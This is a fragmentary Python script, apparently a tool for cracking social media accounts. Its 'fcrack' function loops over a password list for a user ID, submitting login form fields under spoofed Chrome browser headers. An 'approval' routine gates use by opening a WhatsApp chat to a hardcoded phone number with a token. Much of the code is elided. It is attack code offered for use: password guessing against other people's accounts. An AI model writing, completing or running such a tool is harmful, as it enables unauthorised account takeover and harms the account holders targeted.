...
def fcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'www.google.com',
            ...
            'sec-ch-ua-arch': '""',
            'sec-ch-ua-bitness': '""',  
            'sec-ch-ua-full-version': '"112.0.5631.195"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="112.0.5631.195", "Google Chrome";v="112.0.5631.195"',
            'sec-ch-ua-mobile': '?0',
            ...
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5631.195 Safari/537.36',
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('time.sleep(1)Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923498410573?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
